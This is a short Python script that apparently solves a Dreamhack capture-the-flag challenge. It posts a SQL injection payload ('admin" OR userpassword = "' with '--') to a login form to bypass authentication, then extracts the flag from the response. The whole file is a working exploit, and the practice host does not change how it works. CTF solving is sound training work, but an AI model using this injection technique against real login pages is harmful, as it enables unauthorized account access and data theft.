import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 9005

res = requests.post(
    f"{HOST}:{PORT}/login",
    data={"userid": 'admin" OR userpassword = "', "userpassword": "--"},
)
flag = re.search(r"DH{.*}", res.text).group()
print(flag)
